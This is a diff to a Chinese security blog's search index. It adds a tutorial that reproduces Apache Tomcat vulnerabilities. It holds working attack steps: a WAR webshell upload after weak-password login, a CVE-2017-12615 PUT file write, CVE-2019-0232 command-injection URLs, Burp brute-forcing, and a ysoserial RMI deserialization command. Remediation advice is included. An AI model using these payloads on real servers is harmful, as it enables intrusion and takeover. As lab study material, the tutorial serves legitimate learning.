@@ -1,6 +1,153 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>中间件漏洞之Tomcat</title>
+    <url>/2020/04/12/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BTomcat/</url>
+    <content><![CDATA[<p>中间件Tomcat漏洞的一次总结<a id="more"></a></p>
+<h1 id="Tomcat简介"><a href="#Tomcat简介" class="headerlink" title="Tomcat简介"></a>Tomcat简介</h1><blockquote>
+<p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。</p>
+</blockquote>
+<h1 id="Tomcat常见漏洞整理："><a href="#Tomcat常见漏洞整理：" class="headerlink" title="Tomcat常见漏洞整理："></a>Tomcat常见漏洞整理：</h1><p><img src="/images/tomcat/Tomcat.png" alt=""></p>
+<h2 id="后台弱口令上传war包Getshell漏洞"><a href="#后台弱口令上传war包Getshell漏洞" class="headerlink" title="后台弱口令上传war包Getshell漏洞"></a>后台弱口令上传war包Getshell漏洞</h2><p>1、修改conf/tomcat-users.xml文件的中配置用户的权限：<br><a href="http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html" target="_blank" rel="noopener">Configuring Manager Application Access</a></p>
+<pre><code>&lt;tomcat-users&gt;
+&lt;role rolename=&quot;manager-gui&quot;/&gt;
+&lt;role rolename=&quot;manager-script&quot;/&gt;
+&lt;role rolename=&quot;manager-jmx&quot;/&gt;
+&lt;role rolename=&quot;manager-status&quot;/&gt;
+&lt;role rolename=&quot;admin-gui&quot;/&gt;
+&lt;role rolename=&quot;admin-script&quot;/&gt;
+&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; /&gt;</code></pre><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p>
+<p>2、我们访问：</p>
+<pre><code>http://test.com:8080/manager/html/</code></pre><p>输入弱密码：tomcat：tomcat。登陆到后台</p>
+<p>3、选择一个jsp生成war包并且上传</p>
+<pre><code>jar -cvf job.war job.jsp
+or
+zip -r job.zip job.jsp &amp;&amp; mv job.zip job.war</code></pre><p><img src="/images/tomcat/1.png" alt=""></p>
+<p>上传成功我们可以看到返回包的路径</p>
+<p><img src="/images/tomcat/2.png" alt=""></p>
+<p>访问：</p>
+<pre><code>http://test.com:8080/上传war包名/文件名</code></pre><p>例如：</p>
+<pre><code>http://test.com:8080/job/job.jsp</code></pre><p><img src="/images/tomcat/3.png" alt=""></p>
+<h2 id="PUT方法任意文件写入（CVE-2017-12615）"><a href="#PUT方法任意文件写入（CVE-2017-12615）" class="headerlink" title="PUT方法任意文件写入（CVE-2017-12615）"></a>PUT方法任意文件写入（CVE-2017-12615）</h2><p>修改/conf/web.xml</p>
+<p><img src="/images/tomcat/5.png" alt=""></p>
+<p>直接PUT方法发送数据包即可在Web根目录写入shell：</p>
+<p>（readonly=false）<br><img src="/images/tomcat/4.png" alt=""></p>
+<p>成功写入文件，之后访问一下web根目录<br><img src="/images/tomcat/6.png" alt=""></p>
+<p>（readonly=true）<br><img src="/images/tomcat/7.png" alt=""></p>
+<p>更改配置之后返回403，不再可以写入<br><img src="/images/tomcat/8.png" alt=""></p>
+<h2 id="远程代码执行（CVE-2019-0232）"><a href="#远程代码执行（CVE-2019-0232）" class="headerlink" title="远程代码执行（CVE-2019-0232）"></a>远程代码执行（CVE-2019-0232）</h2><p>影响版本：</p>
+<pre><code>9.0.0.M1 ~ 9.0.17, 8.5.0 ~ 8.5.39 ， 7.0.0 ~ 7.0.93</code></pre><p>影响系统及条件：</p>
+<pre><code>Windows
+启用了CGI Servlet（默认为关闭）
+启用了enableCmdLineArguments（Tomcat 9.0.*及后续版本默认关闭）</code></pre><p>1、环境搭建：</p>
+<pre><code>#本次使用的环境为：
+Windows 10
+jre：1.8.0_241
+apache-tomcat-8.5.39</code></pre><p>（1）、启用CGI Servlet（修改conf/web.xml）</p>
+<p><img src="/images/tomcat/9.png" alt=""><br><img src="/images/tomcat/10.png" alt=""></p>
+<pre><code>&lt;init-param&gt;
+  &lt;param-name&gt;debug&lt;/param-name&gt;
+  &lt;param-value&gt;0&lt;/param-value&gt;
+&lt;/init-param&gt;
+&lt;init-param&gt;
+  &lt;param-name&gt;executable&lt;/param-name&gt;
+  &lt;param-value&gt;&lt;/param-value&gt;
+&lt;/init-param&gt;</code></pre><p>（2）、给予CGI_Servlet启动权限（修改conf/content.xml）</p>
+<p><img src="/images/tomcat/11.png" alt=""></p>
+<pre><code>&lt;Context privileged=&quot;true&quot;&gt;</code></pre><p>（3）、在webapps\ROOT\WEB-INF新建一个cgi目录（这个取决于<br>cgiPathPrefix的param-value的值”WEB-INF/cgi”）然后新建一个test.bat内容任意。</p>
+<p><img src="/images/tomcat/12.png" alt=""></p>
+<p>2、漏洞复现：</p>
+<p>payload：</p>
+<pre><code>http://localhost:8080/cgi-bin/test.bat?&amp;dir</code></pre><p><img src="/images/tomcat/13.png" alt=""></p>
+<pre><code>http://localhost:8080/cgi-bin/test.bat?&amp;C:/WINDOWS/system32/net+user</code></pre><p><img src="/images/tomcat/14.png" alt=""></p>
+<p>3、修复建议：</p>
+<pre><code>1、安装Apache Tomcat官方补丁升级进行防护
+2、将CGI Servlet初始化参数enableCmdLineArguments设置为false</code></pre><h2 id="manager-暴力破解（burp）"><a href="#manager-暴力破解（burp）" class="headerlink" title="manager 暴力破解（burp）"></a>manager 暴力破解（burp）</h2><p>1、环境搭建</p>
+<p>添加如下代码：（在conf/tomcat-users.xml）</p>
+<p><img src="/images/tomcat/15.png" alt=""></p>
+<pre><code>&lt;role rolename=&quot;tomcat-gui&quot;/&gt;
+&lt;role rolename=&quot;manager-gui&quot;/&gt;
+&lt;role rolename=&quot;manager-script&quot;/&gt;
+&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui&quot;/&gt;
+&lt;user username=&quot;admin&quot; password=&quot;123456&quot; roles=&quot;tomcat-gui,manager-gui,manager-script&quot;/&gt;</code></pre><p>2、使用burp进行暴力破解:</p>
+<p>（1）、访问 <a href="http://localhost:8080/manager/html" target="_blank" rel="noopener">http://localhost:8080/manager/html</a> 截取如下包：</p>
+<p><img src="/images/tomcat/16.png" alt=""></p>
+<p>（2）、发送到intruder模块之后标记 dG9tY2F0OjEyMzQ1Ng</p>
+<pre><code>payload type选择custom iterator
+position 设置为3
+（其中第一个为用户字典）
+（第二个为：）
+（第三个为密码字典）</code></pre><p><img src="/images/tomcat/17.png" alt=""></p>
+<pre><code>最后添加如下rule和取消url编码</code></pre><p><img src="/images/tomcat/18.png" alt=""></p>
+<p>（3）、开始爆破之后成功返回 200<br><img src="/images/tomcat/19.png" alt=""></p>
+<p>进行解码<br><img src="/images/tomcat/20.png" alt=""></p>
+<p>3、修复建议：</p>
+<pre><code>如果没有必要取消manager功能
+设置复杂性高的密码
+设置manager只允许本地IP访问</code></pre><h2 id="反序列化漏洞-CVE-2016-8735"><a href="#反序列化漏洞-CVE-2016-8735" class="headerlink" title="反序列化漏洞(CVE-2016-8735)"></a>反序列化漏洞(CVE-2016-8735)</h2><p>影响版本：</p>
+<pre><code>9.0.0.M1 ~ 9.0.0.M11
+8.5.0 ~ 8.5.6
+8.0.0.RC1 ~ 8.0.38
+7.0.0 ~ 7.0.72
+6.0.0 ~ 6.0.47</code></pre><p>1、环境搭建：</p>
+<pre><code>#本次使用的环境为：
+Windows 7
+jre：1.7.0_80
+apache-tomcat-8.5.39</code></pre><p><a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html#jdk-7u80-oth-JPR" target="_blank" rel="noopener">jre下载</a></p>
+<p><a href="https://archive.apache.org/dist/tomcat/tomcat-8/" target="_blank" rel="noopener">tomcat下载</a></p>
+<p>（1）、启用JmxRemoteLifecycleListener功能监听（在conf/server.xml）</p>
+<p><img src="/images/tomcat/21.png" alt=""></p>
+<pre><code>&lt;Listener className=&quot;org.apache.catalina.mbeans.JmxRemoteLifecycleListener&quot; rmiRegistryPortPlatform=&quot;10001&quot; rmiServerPortPlatform=&quot;10002&quot; /&gt;</code></pre><p>(2)、下载对应版本的<a href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.39/bin/extras/" target="_blank" rel="noopener">catalina-jmx-remote.jar</a>包和<a href="https://mvnrepository.com/artifact/org.codehaus.groovy/groovy/2.3.9" target="_blank" rel="noopener">groovy-2.3.9.jar</a>包,放到tomcat的lib目录下。</p>
+<p>（3）、修改bin/catalina.bat，在Execute The Requested Command上面添加内容</p>
+<p><img src="/images/tomcat/22.png" alt=""></p>
+<pre><code>set CATALINA_OPTS=-Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false
+#后面两个false分别代表：指定不使用SSL通讯、指定不需要密码验证</code></pre><p>（4）、修改完成之后启动tomcat，查看10001和10002的RMI服务端口是否运行。</p>
+<p><img src="/images/tomcat/23.png" alt=""></p>
+<p>2、漏洞复现：</p>
+<p>使用<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>发送payload</p>
+<pre><code>java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.11.14 10001 Groovy1 calc.exe</code></pre><p><img src="/images/tomcat/24.png" alt=""></p>
+<p>成功弹出计算器（在使用jre-1.8.0_241的时候出现报错）</p>
+<p>另外，POC的编写可以参考：<a href="https://blog.spoock.com/2019/09/20/cve-2016-8735/" target="_blank" rel="noopener">https://blog.spoock.com/2019/09/20/cve-2016-8735/</a></p>
+<p>3、修复建议:</p>
+<pre><code>更新对应的版本；
+关闭JmxRemoteLifecycleListener功能，对jmx JmxRemoteLifecycleListener远程端口进行网络访问控制。</code></pre><h2 id="样例目录session操控漏洞"><a href="#样例目录session操控漏洞" class="headerlink" title="样例目录session操控漏洞"></a>样例目录session操控漏洞</h2><p>1、漏洞分析：</p>
+<p>在webapps\examples\servlets\sessions.html</p>
+<p><img src="/images/tomcat/25.png" alt=""></p>
+<pre><code>String dataName = request.getParameter(&amp;quot;&lt;font color=&quot;#009900&quot;&gt;dataName&lt;/font&gt;&amp;quot;);//获取dataname参数的值
+if (dataName != null &amp;amp;&amp;amp; dataName.length() &amp;gt; 0) {
+    String dataValue = request.getParameter(&amp;quot;&lt;font color=&quot;#009900&quot;&gt;dataValue&lt;/font&gt;&amp;quot;);//获取dataValue参数的值
+    session.setAttribute(dataName, dataValue);//将dataname和datavalue写入session
+}</code></pre><p>通过表单用户提交的name和value这两个参数值。由request.getParameter()函数来获取这两个值，然后通过session.setAttribute()传递给session。从而可以通过前端页面去控制session的值来获取管理员权限。</p>
+<p>2、环境搭建</p>
+<pre><code>#本次使用的环境
+jre：1.7.0_80
+apache-tomcat-8.5.39</code></pre><p>在webapps\examples新建三个页面模拟登陆页面操控session获取权限</p>
+<p><img src="/images/tomcat/26.png" alt=""><br><img src="/images/tomcat/27.png" alt=""><br><img src="/images/tomcat/28.png" alt=""></p>
+<p>3、复现过程</p>
+<p>（1）、访问登陆页面并抓包</p>
+<pre><code>http://192.168.11.14:8080/examples/index.jsp</code></pre><p>由于没有管理员的session所以被302重定向到了login.jsp</p>
+<p><img src="/images/tomcat/29.png" alt=""></p>
+<p>(2)、操作session进入后台</p>
+<p>打开：SessionExample</p>
+<pre><code>http://192.168.11.14:8080/examples/servlets/servlet/SessionExample</code></pre><p>输入login：admin并且提交</p>
+<p><img src="/images/tomcat/30.png" alt=""></p>
+<p>提交后提示已经写入sessio<br><img src="/images/tomcat/31.png" alt=""></p>
+<p>再次访问</p>
+<pre><code>http://192.168.11.14:8080/examples/index.jsp</code></pre><p>这个时候提示登陆成功<br><img src="/images/tomcat/32.png" alt=""></p>
+<h2 id="本地提权漏洞-CVE-2016-1240"><a href="#本地提权漏洞-CVE-2016-1240" class="headerlink" title="本地提权漏洞(CVE-2016-1240)"></a>本地提权漏洞(CVE-2016-1240)</h2><p>参考：<a href="https://www.jianshu.com/p/94e4feac245f" target="_blank" rel="noopener">https://www.jianshu.com/p/94e4feac245f</a></p>
+<hr>
+<ul>
+<li>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</li>
+</ul>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>中间件</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>中间件漏洞之Nginx</title>
     <url>/2020/04/09/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BNginx/</url>
     <content><![CDATA[<p>中间件nginx常见漏洞记录<a id="more"></a></p>
@@ -102,7 +249,7 @@ location = /test2 {
 <ul>
 <li><p>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</p>
 </li>
-<li><p>本文属于<a href="https://aqyoung.github.io/" target="_blank" rel="noopener" title="https://aqyoung.github.io/">@ayoung博客</a>，未经许可禁止转载：</p>
+<li><p>本文属于<a href="https://aqyoung.github.io/" title="https://aqyoung.github.io/">@ayoung博客</a>，未经许可禁止转载：</p>
 </li>
 </ul>
 ]]></content>
@@ -144,7 +291,7 @@ deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted unive
 EOF</code></pre><h2 id="3、更新"><a href="#3、更新" class="headerlink" title="3、更新"></a>3、更新</h2><pre><code># 更新软件列表
 sudo apt-get update
 # 更新软件
-sudo apt-get upgrade</code></pre><h2 id="4、安装docker"><a href="#4、安装docker" class="headerlink" title="4、安装docker"></a>4、安装docker</h2><p><a href="https://aqyoung.github.io/2020/04/05/docker%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" target="_blank" rel="noopener">见docker简单使用指南</a></p>
+sudo apt-get upgrade</code></pre><h2 id="4、安装docker"><a href="#4、安装docker" class="headerlink" title="4、安装docker"></a>4、安装docker</h2><p><a href="https://aqyoung.github.io/2020/04/05/docker%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">见docker简单使用指南</a></p>
 <h2 id="5、配置ssh和静态ip（Ubuntu18-04）"><a href="#5、配置ssh和静态ip（Ubuntu18-04）" class="headerlink" title="5、配置ssh和静态ip（Ubuntu18.04）"></a>5、配置ssh和静态ip（Ubuntu18.04）</h2><h3 id="5-1-配置静态IP"><a href="#5-1-配置静态IP" class="headerlink" title="5.1 配置静态IP"></a>5.1 配置静态IP</h3><pre><code>cd /etc/netplan
 ls
 #看看是否有01-network-manager-all.yaml编辑他
@@ -334,7 +481,7 @@ Server:
 <ul>
 <li><p>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</p>
 </li>
-<li><p>本文属于<a href="https://aqyoung.github.io/" target="_blank" rel="noopener" title="https://aqyoung.github.io/">@ayoung博客</a>，未经许可禁止转载：</p>
+<li><p>本文属于<a href="https://aqyoung.github.io/" title="https://aqyoung.github.io/">@ayoung博客</a>，未经许可禁止转载：</p>
 </li>
 </ul>
 ]]></content>
@@ -583,7 +730,7 @@ EOF</code></pre><p><img src="https://i.imgur.com/NP5H2D9.png" alt=""></p>
 <ul>
 <li><p>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</p>
 </li>
-<li><p>本文属于<a href="https://aqyoung.github.io/" target="_blank" rel="noopener" title="https://aqyoung.github.io/">@ayoung博客</a>，未经许可禁止转载：</p>
+<li><p>本文属于<a href="https://aqyoung.github.io/" title="https://aqyoung.github.io/">@ayoung博客</a>，未经许可禁止转载：</p>
 </li>
 </ul>
 ]]></content>
@@ -655,7 +802,7 @@ if(isset($_FILES[&apos;file&apos;])) {
 <ul>
 <li><p>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</p>
 </li>
-<li><p>本文属于<a href="https://aqyoung.github.io/" target="_blank" rel="noopener" title="https://aqyoung.github.io/">@ayoung博客</a>，未经许可禁止转载：</p>
+<li><p>本文属于<a href="https://aqyoung.github.io/" title="https://aqyoung.github.io/">@ayoung博客</a>，未经许可禁止转载：</p>
 </li>
 </ul>
 ]]></content>
@@ -798,7 +945,7 @@ fsutil behavior set disable8dot3 1
 <ul>
 <li><p>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</p>
 </li>
-<li><p>本文属于<a href="https://aqyoung.github.io/" target="_blank" rel="noopener" title="https://aqyoung.github.io/">@ayoung博客</a>，未经许可禁止转载：</p>
+<li><p>本文属于<a href="https://aqyoung.github.io/" title="https://aqyoung.github.io/">@ayoung博客</a>，未经许可禁止转载：</p>
 </li>
 </ul>
 ]]></content>
